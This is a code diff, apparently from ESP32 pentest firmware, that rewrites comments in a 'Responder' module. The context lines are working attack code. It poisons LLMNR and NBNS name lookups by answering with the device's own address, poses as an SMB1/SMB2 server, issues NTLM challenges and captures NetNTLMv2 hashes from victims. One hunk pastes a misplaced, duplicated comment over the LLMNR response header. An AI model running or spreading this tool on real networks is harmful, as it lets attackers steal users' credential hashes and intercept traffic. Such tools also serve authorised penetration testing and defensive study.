@@ -1,11 +1,9 @@
 /*
-============================================================================================================================
-Responder
-============================================================================================================================
-Thanks 7h30th3r0n3 for making this possible in esp32
-https://github.com/7h30th3r0n3/Evil-M5Project
-============================================================================================================================
-*/
+ * Responder
+ *
+ * Thanks 7h30th3r0n3 for making this possible in esp32
+ * https://github.com/7h30th3r0n3/Evil-M5Project
+ */
 #ifndef LITE_VERSION
 #include "responder.h"
 #include "clients.h"
@@ -50,7 +48,10 @@ struct SMBClientState {
     uint8_t challenge[8];
 } smbState;
 
-/* =================  CONST & FLAGS SMB  ================= */
+/*
+ * SMB1 reply flags, FLAGS2 capability bits, and the negotiated capabilities
+ * bitmap used by the negotiate and session-setup responses.
+ */
 #define SMB_FLAGS_REPLY 0x80
 #define SMB_FLAGS2_UNICODE 0x8000
 #define SMB_FLAGS2_ERR_STATUS32 0x4000
@@ -65,7 +66,6 @@ struct SMBClientState {
 
 const uint32_t SMB_CAPABILITIES = SMB_CAP_EXTSEC | SMB_CAP_LARGE_FILES | SMB_CAP_NT_SMBS | SMB_CAP_UNICODE |
                                   SMB_CAP_STATUS32; // ≈ 0x8000005C
-/* ====================================================== */
 
 void encodeNetBIOSName(const char *name, uint8_t out[32]) {
     // Préparer le nom sur 15 caractères (pad avec espaces) + type (0x20)
@@ -350,10 +350,16 @@ const uint8_t spnegoInitToken[] = {
 void sendSMB1NegotiateResponse(uint8_t *req) {
     uint8_t resp[256] = {0};
 
-    /* ─── NBSS ─── */
+    /*
+     * NBSS (NetBIOS Session Service) session-message header; the 3-byte
+     * payload length is back-filled once the full frame size is known.
+     */
     resp[0] = 0x00; // Session message – length rempli plus bas
 
-    /* ─── HEADER SMB (32 octets) ─── */
+    /*
+     * 32-byte SMBv1 header, copied from the request then rewritten with the
+     * NEGOTIATE command and the reply/unicode/status flags.
+     */
     memcpy(resp + 4, req, 32);
     resp[4 + 4] = 0x72; // Command = NEGOTIATE
     resp[4 + 9] = SMB_FLAGS_REPLY;
@@ -363,7 +369,10 @@ void sendSMB1NegotiateResponse(uint8_t *req) {
 
     *(uint32_t *)(resp + 4 + 5) = 0x00000000; // STATUS_SUCCESS
 
-    /* ─── PARAMS ─── */
+    /*
+     * Negotiate response parameters block (WordCount = 17): dialect index,
+     * security mode, buffer/raw sizes, capabilities, and an ExtSec BCC of 0.
+     */
     const uint8_t WC = 17;
     resp[4 + 32] = WC; // WordCount
 
@@ -381,12 +390,18 @@ void sendSMB1NegotiateResponse(uint8_t *req) {
     *(uint16_t *)(p + 31) = 0;                // TimeZone
     *(p + 33) = 0;                            // ChallengeLength = 0 (mode ExtSec)
 
-    /* ─── DATA (BCC) : SPNEGO Init ─── */
+    /*
+     * Data block (BCC): append the static SPNEGO init token so the client
+     * selects extended security and proceeds to NTLM authentication.
+     */
     uint16_t bcc = sizeof(spnegoInitToken);
     *(uint16_t *)(resp + 4 + 33 + WC * 2) = bcc;
     memcpy(resp + 4 + 33 + WC * 2 + 2, spnegoInitToken, bcc);
 
-    /* ─── Longueur NBSS ─── */
+    /*
+     * Compute the total frame length and write it into the NBSS length field
+     * so the client can delimit the session message.
+     */
     uint32_t total = 4 + 33 + WC * 2 + 2 + bcc;
     resp[1] = (total - 4) >> 16;
     resp[2] = (total - 4) >> 8;
@@ -444,10 +459,16 @@ void sendSMB1Type2(uint8_t *req, uint8_t *ntlm1) {
 void sendSMB2NegotiateFromSMB1() {
     uint8_t resp[256] = {0};
 
-    /* ── 1.  NBSS ─────────────────────────────────────────── */
+    /*
+     * NBSS session-message length prefix for the SMB2 negotiate upgrade
+     * response; the length bytes are filled after the frame is sized.
+     */
     resp[0] = 0x00; // Session message, LEN plus bas
 
-    /* ── 2.  HEADER SMB‑2 (64 oct.) ───────────────────────── */
+    /*
+     * 64-byte SMB2 header: protocol signature, NEGOTIATE command,
+     * server-to-client flag, a Windows-like ProcessId, and a zeroed signature.
+     */
     uint8_t *h = resp + 4;
     h[0] = 0xFE;
     h[1] = 'S';
@@ -470,7 +491,10 @@ void sendSMB2NegotiateFromSMB1() {
     *(uint64_t *)(h + 40) = 0;          // SessionId = 0
     memset(h + 48, 0, 16);              // Signature (pas de signing)
 
-    /* ── 3.  Corps NEGOTIATE RESPONSE (65 oct.) ───────────── */
+    /*
+     * 65-byte SMB2 NEGOTIATE_RESPONSE body: dialect 0x0202, signing-enabled
+     * mode, a random 16-byte server GUID, and max transfer/read/write sizes.
+     */
     uint8_t *p = h + 64;
     p[0] = 0x41;
     p[1] = 0x00; // StructureSize = 65
@@ -494,7 +518,10 @@ void sendSMB2NegotiateFromSMB1() {
     *(uint16_t *)(p + 58) = 0;          // SecBufLength
     /* (p+60..64  NégContext = 0 / Reserved) */
 
-    /* ── 4.  Longueur NBSS ────────────────────────────────── */
+    /*
+     * Total frame length (4 + 64 + 65) written into the NBSS length field for
+     * the SMB2 negotiate response.
+     */
     uint32_t total = 4 + 64 + 65; // = 133
     resp[1] = (total - 4) >> 16;
     resp[2] = (total - 4) >> 8;
@@ -509,7 +536,10 @@ void handleSMB1(uint8_t *pkt, uint32_t len) {
     // Structure header SMBv1 (32 octets)
     uint8_t command = pkt[4]; // offset 4
 
-    // ----------  NEGOTIATE (0x72)  ----------
+    /*
+     * Handler for SMB_COM_NEGOTIATE (0x72): inspect the requested dialects and
+     * either upgrade the client to SMB2 or answer with an SMB1 ExtSec response.
+     */
     if (command == 0x72) {
         /* point de départ = tout de suite après le BCC (2 octets)           */
         uint16_t bcc = pkt[33] | (pkt[34] << 8); // ByteCount
@@ -541,7 +571,11 @@ void handleSMB1(uint8_t *pkt, uint32_t len) {
         }
         return;
     }
-    // ----------  SESSION SETUP ANDX (0x73) ----------
+    /*
+     * Handler for SMB_COM_SESSION_SETUP_ANDX (0x73): parse the NTLMSSP payload,
+     * send a Type-2 challenge on Type-1, and capture the NetNTLMv2 hash on
+     * Type-3.
+     */
     if (command == 0x73) { // SMB_COM_SESSION_SETUP_ANDX
         if (len < 47) return;
         uint16_t andxOffset = *(uint16_t *)(pkt + 45); // début des données NTLM
@@ -594,10 +628,11 @@ void decodeNetBIOSLabel(const uint8_t *enc32, char *out, size_t outSize) {
     snprintf(out, outSize, "%s<%02X>", name, suffix);
 }
 
-/***************************************************************************************
-** Function name:           responder
-** Description:             Main function to start LLMNR Poisoning and wait for Clients Interection
-***************************************************************************************/
+/*
+ * responder — main entry point: ensures Wi-Fi is connected, asks for the
+ * NetBIOS name to spoof, then starts the NBNS/LLMNR poisoning listeners and
+ * waits for client interaction to capture hashes.
+ */
 void responder() {
 
     drawMainBorderWithTitle("RESPONDER");
@@ -725,21 +760,24 @@ void responder() {
                 }
             }
         }
-        /**************** Traitement des requêtes LLMNR ****************/
+        /*
+         * LLMNR query handling: read inbound UDP packets on the LLMNR multicast port
+         * and answer A/AAAA queries with this device's own address.
+         */
         packetSize = llmnrUDP.parsePacket();
         if (packetSize > 0) {
             uint8_t buf[300];
             int len = llmnrUDP.read(buf, sizeof(buf));
             Serial.printf("[LLMNR] paquet %d octets received\n", len);
 
-            /* 1) Contrôles de base ------------------------------------------------ */
+            /* 1) Contrôles de base */
             if (len < 12) continue; // trop court
             uint16_t flags = (buf[2] << 8) | buf[3];
             uint16_t qdCount = (buf[4] << 8) | buf[5];
             uint16_t anCount = (buf[6] << 8) | buf[7];
             if ((flags & 0x8000) || qdCount == 0 || anCount != 0) continue; // here modif return en continue
 
-            /* 2) Lecture du premier label (on ne gère qu’un seul label simple) ---- */
+            /* 2) Lecture du premier label (on ne gère qu’un seul label simple) */
             uint8_t nameLen = buf[12];
             if (nameLen == 0 || nameLen >= 64 || (13 + nameLen + 4) > len) continue;
             if (buf[13 + nameLen] != 0x00) continue; // on veut exactement 1 label + terminator
@@ -748,7 +786,7 @@ void responder() {
             uint16_t qType = (qtypePtr[0] << 8) | qtypePtr[1];
             uint16_t qClass = (qtypePtr[2] << 8) | qtypePtr[3];
 
-            /* 3) Debug : affichage du nom et du type --------------------------------*/
+            /* 3) Debug : affichage du nom et du type */
             char qName[65];
             memcpy(qName, buf + 13, nameLen);
             qName[nameLen] = '\0';
@@ -756,18 +794,24 @@ void responder() {
             lastQueryName = String(qName);
             lastQueryProtocol = "LLMNR";
 
-            /* 4) On répond aux types A (0x0001) et AAAA (0x001C) ------------------- */
+            /* 4) On répond aux types A (0x0001) et AAAA (0x001C) */
             bool isA = (qType == 0x0001);
             bool isAAAA = (qType == 0x001C);
             if (!isA && !isAAAA) continue; // on ignore les autres
 
             if (qClass != 0x0001) continue; // IN seulement
 
-            /* 5) Construction de la réponse --------------------------------------- */
+            /* 5) Construction de la réponse */
             uint16_t questionLen = 1 + nameLen + 1 + 2 + 2; // label + len0 + type + class
             uint8_t resp[350];
 
-            /* -- Header -- */
+            /*
+
+             * LLMNR query handling: read inbound UDP packets on the LLMNR multicast port
+
+             * and answer A/AAAA queries with this device's own address.
+
+             */
             resp[0] = buf[0];
             resp[1] = buf[1]; // Transaction ID
             resp[2] = 0x84;
@@ -779,10 +823,10 @@ void responder() {
             resp[8] = resp[9] = 0x00;   // NScount
             resp[10] = resp[11] = 0x00; // ARcount
 
-            /* -- Question copiée telle quelle -- */
+            /* Question section copied verbatim from the incoming query. */
             memcpy(resp + 12, buf + 12, questionLen);
 
-            /* -- Answer -- */
+            /* Answer section: name pointer, echoed type/class, and a 30 s TTL. */
             uint16_t ansOff = 12 + questionLen;
             resp[ansOff + 0] = 0xC0; // pointeur 0xC00C vers le nom en question
             resp[ansOff + 1] = 0x0C;
@@ -796,7 +840,9 @@ void responder() {
             resp[ansOff + 9] = 0x1E;
 
             if (isA) {
-                /* ---- Réponse IPv4 (4 octets) ---- */
+                /*
+                 * A-record answer: RDLENGTH = 4 and this device's IPv4 address as RDATA.
+                 */
                 resp[ansOff + 10] = 0x00;
                 resp[ansOff + 11] = 0x04; // RDLENGTH
                 IPAddress ip = getIPAddress();
@@ -809,7 +855,10 @@ void responder() {
                 llmnrUDP.endPacket();
                 // addDetectionPoint();
             } else {
-                /* ---- Réponse IPv6 (on renvoie ::FFFF:IPv4) ---- */
+                /*
+                 * AAAA-record answer: RDLENGTH = 16, returning the IPv4-mapped IPv6
+                 * address ::FFFF:a.b.c.d.
+                 */
                 resp[ansOff + 10] = 0x00;
                 resp[ansOff + 11] = 0x10; // RDLENGTH = 16
                 /* ::ffff:a.b.c.d  →  0…0 ffff  + IPv4 */
@@ -1047,8 +1096,7 @@ void responder() {
                                                     packet + ntlmIndex // pointeur début NTLMSSP
                                                 );
 
-                                                // --- réponse finale SMB2 « success » puis fermeture
-                                                // ----------
+                                                // réponse finale SMB2 « success » puis fermeture
                                                 uint8_t resp[100];
                                                 resp[0] = 0x00;                           // NBSS
                                                 memcpy(resp + 4, packet, 64);             // header copié
